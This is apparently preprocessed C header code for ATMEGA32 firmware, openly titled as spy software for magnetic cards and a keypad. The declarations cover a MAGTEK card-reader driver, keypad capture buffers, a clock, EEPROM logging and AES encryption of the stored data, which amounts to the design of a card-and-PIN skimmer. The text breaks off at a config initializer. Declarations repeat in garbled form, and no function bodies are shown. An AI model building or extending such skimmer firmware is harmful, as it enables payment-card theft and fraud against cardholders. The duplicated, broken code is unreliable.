/*************************************************************************************************************
*    Titre	      : Logiciel d'espion pour carte magnétique sur ATMEGA32
*    Fichier      : main.c
*    SW Version   : 
*	 HW Version   : 3.1
*    Date début   : 9/07/2010
*    Mise à jours : 
**************************************************************************************************************/
/**************************************************************************************************************
 ** @file main.c
 ** @brief	Logiciel d'espion pour carte magnétique et clavier.
 **************************************************************************************************************/
// CodeVisionAVR C Compiler
// (C) 1998-2006 Pavel Haiduc, HP InfoTech S.R.L.
// Prototypes for standard I/O functions
// CodeVisionAVR C Compiler
// (C) 1998-2002 Pavel Haiduc, HP InfoTech S.R.L.
// Variable length argument list macros
typedef char *va_list;
typedef char *va_list;
typedef char *va_list;
typedef char *va_list;
typedef char *va_list;
#pragma used+
char getchar(void);
void putchar(char c);
void puts(char *str);
void putsf(char flash *str);
char *gets(char *str,unsigned int len);
void printf(char flash *fmtstr,...);
void sprintf(char *str, char flash *fmtstr,...);
void snprintf(char *str, unsigned int size, char flash *fmtstr,...);
void vprintf (char flash * fmtstr, va_list argptr);
void vsprintf (char *str, char flash * fmtstr, va_list argptr);
void vsnprintf (char *str, unsigned int size, char flash * fmtstr, va_list argptr);
signed char scanf(char flash *fmtstr,...);
signed char sscanf(char *str, char flash *fmtstr,...);
                                               #pragma used-
#pragma library stdio.lib
/*************************************************************************************************************
*    Titre:         Définitions du module d'encryption AES.
*    Fichier:       aes.h
*    Date:          07/02/2007
*************************************************************************************************************/
/************************************************************************************************************
 ** @file aes.h                                                                                            
 ** @brief Définitions du module d'encryption AES.                                                           
 ************************************************************************************************************/
/*************************************************************************************************************
	Définition des constantes
*************************************************************************************************************/
/*************************************************************************************************************
	Définition des variables globales
*************************************************************************************************************/
char crypto_key[32+1];
char crypto_key[32+1];
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
unsigned char rcon(int);
unsigned char sub_s_box(unsigned char, unsigned char);
unsigned char multi(char, char);
int expand_key(unsigned char key[4*4], unsigned char w[4*4*11]);
int select_key(unsigned char expanded_key[4*4*11], unsigned char round_key[4][4], int round);
int byte_sub(unsigned char state[4][4], unsigned char cmd);
int shift_row(unsigned char state[4][4], unsigned char cmd);
int mix_column(unsigned char state[4][4], unsigned char cmd);
int add_round_key(unsigned char state[4][4], unsigned char round_key[4][4]);
int aes_round(unsigned char state[4][4], unsigned char round_key[4][4], int round, unsigned char cmd);
int rijndael(unsigned char cmd, unsigned char data[16], unsigned char cipher_key[16]);
/*************************************************************************************************************
 *    Titre	       : Logiciel d'espion pour carte magnétique et clavier.
 *    Fichier      : main.h
 **************************************************************************************************************/
/**************************************************************************************************************
 ** @file	main.h
 ** @brief	Fichier de déclarations pour le module principal.
 **************************************************************************************************************/
 /*************************************************************************************************************
	Définitions des constantes spécifiques à la version
*************************************************************************************************************/
/*************************************************************************************************************
 *    Version      : 7.4.0b
 *    Mise à jours : 20/11/2010
 *
 *    Options:
 *	  --------
 *    - ATMEGA32
 *    - Clavier #3
 *    - Touche 4A
 *    - RTC DS1337
 *    - I2CEEPROM 1024 x 2
 *    - FAUX END
 *
 *    Notes:
 *    ------
 *    - Corrigé les dépassements de I2CEEPROM
 *    - Ralentissement du scanning des touches
 **************************************************************************************************************/
/*************************************************************************************************************
	Définitions des constantes
*************************************************************************************************************/
/************************************************************************************************************/
/*************************************************************************************************************
	Définition des variables globales
*************************************************************************************************************/
char enkey[4];
char enkey[4];
char keymap[17];
char kbdebug;
int kb_scan_slacker;
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
void write_kb_i2ceeprom(void);
void write_mag_i2ceeprom(void);
/*************************************************************************************************************
*    Fichier:   usart.h               
*    But:       Fichier d'en-tête du fichier usart.c
*    Date:      6/11/2005 modifié pour atmega 8 29/07/2007
*************************************************************************************************************/
/************************************************************************************************************
 ** @file usart.h                                                                                            
 ** @brief Fichier d'en-tête du fichier usart.c                                                              
 ************************************************************************************************************/
 // CodeVisionAVR C Compiler
// (C) 1998-2006 Pavel Haiduc, HP InfoTech S.R.L.
// Prototypes for standard I/O functions
                                               /*************************************************************************************************************
	Définitions des constantes
*************************************************************************************************************/
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
void USART_init(unsigned long);
void USART_init(unsigned long);
void USART_init(unsigned long);
int USART_putchar(char, FILE *);
int USART_getchar(FILE *);
/*************************************************************************************************************
*    Titre:         Fichier d'en-tête du module d'accès au TWI.
*    Fichier:       twi.h
*    Date:          16/11/2005
*************************************************************************************************************/
/************************************************************************************************************
 ** @file twi.h                                                                                            
 ** @brief Fichier d'en-tête du module d'accès au TWI.                                                             
 ************************************************************************************************************/
/*************************************************************************************************************
	Définitions des constantes
*************************************************************************************************************/
/*************************************************************************************************************
	Définition des réponses d'états du I2C
*************************************************************************************************************/
/** Codes d'états généraux du maitre */										
		/** Codes d'états généraux du maitre transmetteur */											
	/** Codes d'états généraux du maitre récepteur */	
/*************************************************************************************************************
	Définition de la structure de transmission TWI
*************************************************************************************************************/
typedef struct
typedef struct
{
	unsigned char slave_adr;				/** Adresse I2C de l'esclave + !W/R */
	unsigned char size;						/** Nombre d'octets à envoyer ou à reçevoir */  	
	unsigned char *data_ptr;				/** Pointeur sur les données et l'adresse interne */
}tx_type; 
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
extern void Init_TWI(unsigned long);			/**	Fonction permettant d'initialiser le TWI.*/
extern unsigned char Send_to_TWI(tx_type*);		/** Envoi d'une séquence sur le bus TWI. */
unsigned char Send_byte(unsigned char);	/** Envoi d'un octet de données sur le bus TWI. */
unsigned char Get_byte(unsigned char*,char);	/** Réception d'un octet de données sur le bus TWI. */
unsigned char Send_start(void);					/** Envoi la commande START sur le bus TWI. */
unsigned char Send_adr(unsigned char);			/** Envoi de l'adresse de l'esclave sur le bus TWI. */
void Send_stop(void);							/** Envoi la commande STOP sur le bus TWI. */
void Wait_TWI_int(void);						/**	Attends le drapeau d'interruption du TWI. */								
/*************************************************************************************************************
*    Titre:         Définitions pour le module d'accès pour eeprom I2c (24lcXXX)
*    Fichier:       i2ceeprom.h
*    Date:          16/11/2005
*************************************************************************************************************/
/************************************************************************************************************
 ** @file 12ceeprom.h                                                                                            
 ** @brief Définitions pour le module d'accès pour eeprom I2c (24lcXXX)                                                             
 ************************************************************************************************************/
/*************************************************************************************************************
	Définitions des constantes
*************************************************************************************************************/
//#define I2CEEPROM_TOP	0x1FFFF		/** Adresse de fin du eeprom, pour 1x 24lc1024 */
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
char I2CEEPROM_write(unsigned long, unsigned int, char*);
char I2CEEPROM_write(unsigned long, unsigned int, char*);
char I2CEEPROM_read(unsigned long, unsigned int, char*);
void format_mem(void);
/*************************************************************************************************************
*    Titre:         Définitions pour le module d'accès pour eeprom interne
*    Fichier:       eeprom.h
*    Date:          06/02/2007 modifié pour atmega 8 29/07/2007
*************************************************************************************************************/
/************************************************************************************************************
 ** @file eeprom.h                                                                                            
 ** @brief Définitions pour le module d'accès pour eeprom interne                                                            
 ************************************************************************************************************/
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
void EEPROM_write(unsigned int, unsigned int, char*);
void EEPROM_write(unsigned int, unsigned int, char*);
void EEPROM_read(unsigned int, unsigned int, char*);
/************************************************************************************************************
*    Titre:         Définitions pour le MAGTEK 21006576
*    Fichier:       magtek.h
*    Date:          6/12/2005
************************************************************************************************************/
/************************************************************************************************************
 ** @file magtek.h                                                                                            
 ** @brief Définitions pour le MAGTEK 21006576                                                        
 ************************************************************************************************************/
/*************************************************************************************************************
	Définitions des constantes
*************************************************************************************************************/
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
void init_MAGTEK(void);
void init_MAGTEK(void);
unsigned int MAGTEK_analyse(void);
/*************************************************************************************************************
	Variables globales 
*************************************************************************************************************/
volatile unsigned char MAGTEK_bits[(41-1)*5];
volatile unsigned int MAGTEK_bit_cnt;
volatile unsigned int MAGTEK_f_bit;
volatile unsigned char MAGTEK_str[41];
volatile unsigned int MAGTEK_rip;
volatile unsigned int MAGTEK_re;
/*************************************************************************************************************
*    Titre:         Fichier d'en-tête pour le clavier 4x4
*    Fichier:       kb.h
*    Date:          4/02/2008
*************************************************************************************************************/
/************************************************************************************************************
 ** @file kb.h                                                                                            
 ** @brief Fichier d'en-tête pour le clavier 4x4                                                            
 ************************************************************************************************************/
/*************************************************************************************************************
	Définitions des constantes
*************************************************************************************************************/
/*************************************************************************************************************
	Définitions des variables globales
*************************************************************************************************************/
volatile unsigned char KB_scan_line;
volatile unsigned char KB_scan_line;
volatile unsigned char KB_key;
volatile unsigned char KB_keypressed;
volatile unsigned char KB_ready;
volatile unsigned int KB_timer;
volatile unsigned char KB_buf[16];
volatile unsigned char KB_char_cnt;
volatile unsigned char KB_in_read;
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
void KB_Init(void);
void KB_int_proc(void);
/************************************************************************************************************
*    Titre:         Définitions pour le RTC Dallas DS1337
*    Fichier:       rtc_ds1337.h
*    Date:          07/09/2007
************************************************************************************************************/
/************************************************************************************************************
 ** @file rtc.h                                                                                            
 ** @brief Définitions pour le RTC Dallas DS1337                                                             
 ************************************************************************************************************/
/*************************************************************************************************************
	Définitions des constantes
*************************************************************************************************************/
/*************************************************************************************************************
	Définition de la structure du temps
*************************************************************************************************************/
typedef struct
typedef struct
{
	unsigned int annee;
	unsigned char mois;
	unsigned char jour;
	unsigned char jour_semaine;
	unsigned char heure;
	unsigned char minute;
	unsigned char seconde;
	unsigned char batt_low;
}temps;
/*************************************************************************************************************
	Variables globales 
*************************************************************************************************************/
temps heure_actuelle;			/** NOTE: il faut effectuer une RTC_get_time() avant de lire. */
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
unsigned char RTC_init(void);
unsigned char RTC_get_time(void);
unsigned char RTC_set_time(void);
unsigned char bcd2dec(unsigned char);
unsigned char dec2bcd(unsigned char);
void print_jour(unsigned char);
/*************************************************************************************************************
*    Fichier:   smalltools.h               
*    But:       Fichier d'en-tête du fichier smalltools.c
*    Date:      16/1/2007
*************************************************************************************************************/
/************************************************************************************************************
 ** @file smalltools.h
 ** @brief Fichier d'en-tête du fichier smalltools.c
 ************************************************************************************************************/
 /*************************************************************************************************************
	Unions et structures
*************************************************************************************************************/
typedef union long_char
typedef union long_char
{
	unsigned long var_long;
	char var_char[4];
} long_char;
/*************************************************************************************************************
	Variables globales
*************************************************************************************************************/
volatile unsigned int delai;
/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
unsigned int USART_getstring(unsigned char, unsigned int, char *);
int stringcomp(char *, char *);
void stringcpy(char *, char *, int);
unsigned int strtoi(char *);
void read_eeptr(unsigned long *);
void write_eeptr(unsigned long);
void wait(unsigned int);
unsigned int crcccitt(unsigned int,char *, unsigned long int);
/*************************************************************************************************************
 *    Titre	       : Fichier pour la définition des variables à stocker en eeprom.
 *    Fichier      : eepvars.h
 **************************************************************************************************************/
/**************************************************************************************************************
 ** @file	eepvars.h
 ** @brief	Fichier pour la définition des variables à stocker en eeprom.
 **************************************************************************************************************/
 /*************************************************************************************************************
 *    Titre	       : Logiciel d'espion pour carte magnétique et clavier.
 *    Fichier      : main.h
 **************************************************************************************************************/
/**************************************************************************************************************
 ** @file	main.h
 ** @brief	Fichier de déclarations pour le module principal.
 **************************************************************************************************************/
 	                 			/*************************************************************************************************************
*    Titre:         Définitions du module d'encryption AES.
*    Fichier:       aes.h
*    Date:          07/02/2007
*************************************************************************************************************/
/************************************************************************************************************
 ** @file aes.h                                                                                            
 ** @brief Définitions du module d'encryption AES.                                                           
 ************************************************************************************************************/
			/*************************************************************************************************************
	Variables dans le EEPROM, propre à la version
**************************************************************************************************************/
typedef struct 
typedef struct 
typedef struct 
typedef struct 
{
	char E_memtest; 					
	char E_conname[9];
	char E_enkey[3];				
	char E_passl1[26];
	char E_passl2[26];
	char E_crypt[32+1]; 
	char E_version[33];
	char E_key[16];
	char E_end;
} eepvars_t; 
eepvars_t EEPVars __attribute__((section(".eeprom"))) = {	'!',		// memtest
